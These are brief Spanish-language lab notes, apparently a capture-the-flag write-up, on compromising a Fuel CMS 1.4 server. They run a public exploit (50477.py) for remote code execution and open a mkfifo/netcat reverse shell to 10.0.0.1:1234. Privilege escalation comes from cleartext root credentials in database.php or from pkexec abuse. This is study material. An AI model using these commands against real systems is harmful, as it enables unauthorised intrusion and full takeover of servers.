PORT   STATE SERVICE
80/tcp open  http

-Visitamos la web y estamos ante un Fuel CMS Version 1.4

-Buscamos exploits con Searchsploit:
	searchsploit fuel

-Hay 3 exploits para la version 1.4.1, los 2 primeros (Remote Code Execution 1 y Remote Code Execution 2 funcionan mal). 

-Elegimos Remote Code Execution 3:
	searchsploit -m php/webapps/50477.py

-Ejecutamos el exploit que nos otorga un cmd en el que tenemos ejecución remota de comandos:
	python3 50477.py -u http://10.10.77.83

-He probado a ejecutar reverse shell en los siguientes lenguajes: Bash, python, perl, ruby, php, nc (la que no es de mkfifo). Ninguno funciona. Esto se debe a que el servidor no tiene instalado el intérprete del lenguaje, la versión que está instalada es distinta o está capado.

-Ejecutamos la reverse shell de mkfifo, que es la única que deja:
	Enter Command $ rm /tmp/f``;``mkfifo` `/tmp/f``;``cat` `/tmp/f``|``/bin/sh` `-i 2>&1|nc 10.0.0.1 1234 >/tmp/f


## Escalada de Privilegios

2 opciones:
	1-Enumerar la máquina hasta encontrar archivo database.php con credenciales de root en texto claro
		/var/www/html/fuel/application/config
			cat database.php
			user: root
			passwd: mememe
			su root
	2-Abusar de /usr/bin/pkexec
		Funciona en todas las máquinas anteriores a Enero de 2022, que es cuando salió el parche de seguridad.

